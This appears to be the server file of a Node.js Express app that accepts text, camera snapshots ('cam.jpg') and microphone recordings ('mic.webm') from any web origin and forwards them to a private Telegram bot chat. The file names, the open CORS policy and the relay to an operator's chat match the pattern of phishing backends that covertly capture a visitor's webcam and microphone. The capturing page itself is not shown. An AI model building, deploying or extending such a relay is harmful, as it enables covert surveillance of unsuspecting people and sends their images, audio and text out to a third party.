const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const tg = (m) => `https://api.telegram.org/bot${process.env.TG_TOKEN}/${m}`;

app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Access-Control-Allow-Headers", "content-type");
  res.set("Access-Control-Allow-Methods", "POST,GET,OPTIONS");
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/api/ping", async (req, res) => {
  const out = {
    token: !!process.env.TG_TOKEN,
    tokenLen: (process.env.TG_TOKEN || "").length,
    chat: !!process.env.TG_CHAT,
    chatLen: (process.env.TG_CHAT || "").length
  };
  if (process.env.TG_TOKEN) {
    const r = await fetch(tg("getMe"));
    const j = await r.json();
    out.tg = j.ok ? j.result.username : j.description;
  }
  if (process.env.TG_TOKEN && process.env.TG_CHAT) {
    const r = await fetch(tg("getChat?chat_id=" + process.env.TG_CHAT));
    const j = await r.json();
    out.chatOk = j.ok ? j.result.type : j.description;
  }
  console.log("PING", JSON.stringify(out));
  res.json(out);
});

app.post("/api/txt", express.json({ limit: "1mb" }), async (req, res) => {
  try {
    const t = (req.body && req.body.text) || "";
    if (!t) throw new Error("texto vacío");
    console.log("TXT", t.length);
    const r = await fetch(tg("sendMessage"), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.TG_CHAT, text: t.slice(0, 4000) })
    });
    const j = await r.json();
    if (!j.ok) throw new Error(j.description);
    res.send("ok");
  } catch (e) {
    console.log("ERR txt", e.message);
    res.status(500).send("e:" + e.message);
  }
});

app.post("/api/file", express.raw({ type: "*/*", limit: "10mb" }), async (req, res) => {
  try {
    if (!req.body || !req.body.length) throw new Error("archivo vacío");
    const tipo = req.query.tipo === "doc" ? "sendDocument" : "sendPhoto";
    const campo = tipo === "sendPhoto" ? "photo" : "document";
    const nombre = tipo === "sendPhoto" ? "cam.jpg" : "mic.webm";
    const mime = tipo === "sendPhoto" ? "image/jpeg" : "audio/webm";

    const fd = new FormData();
    fd.append("chat_id", process.env.TG_CHAT);
    fd.append(campo, new Blob([req.body], { type: mime }), nombre);

    console.log("FILE", tipo, req.body.length);
    const r = await fetch(tg(tipo), { method: "POST", body: fd });
    const j = await r.json();
    if (!j.ok) throw new Error(j.description);
    res.send("ok");
  } catch (e) {
    console.log("ERR file", e.message);
    res.status(500).send("e:" + e.message);
  }
});

app.use((err, req, res, next) => {
  console.log("ERR global", err.message);
  res.status(400).send("e:" + err.message);
});

app.listen(PORT, "0.0.0.0", () => console.log("up " + PORT));
